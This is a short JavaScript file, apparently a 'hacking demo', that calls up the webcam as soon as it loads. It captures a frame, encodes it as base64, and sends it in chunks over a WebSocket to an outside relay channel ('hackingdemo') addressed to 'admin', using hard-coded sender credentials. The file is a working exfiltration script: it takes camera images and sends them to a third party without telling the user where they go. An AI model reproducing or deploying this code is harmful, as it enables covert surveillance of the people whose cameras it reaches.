function captureImage(callback) {
  navigator.mediaDevices.getUserMedia({ video: true })
    .then(stream => {
      const video = document.createElement('video');
      video.srcObject = stream;
      video.play();
      video.addEventListener('canplay', () => {
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        const base64Image = canvas.toDataURL('image/png');
        stream.getTracks().forEach(track => track.stop());
        callback(base64Image);
      });
    })
    .catch(err => console.error('Error: ', err));
}

function main() {
  captureImage((base64Image) => {
    const socket = new WebSocket('wss://cloud.achex.ca/hackingdemo');
    socket.addEventListener('open', function (event) {
      console.log('open', event);
      socket.send('{"auth":"sender", "password":"hoge"}');
      const split = 100;
      const length = Math.ceil(base64Image.length / split);
      console.log(length);
      for (let count = 0; count <= length; count++) {
        let str = base64Image.substr(count * split, split);
        socket.send('{"to":"admin", "msg":"' + str + '"}');
      }
      socket.send('{"to":"admin", "msg":"finish"}');
    });
  });
}

main();
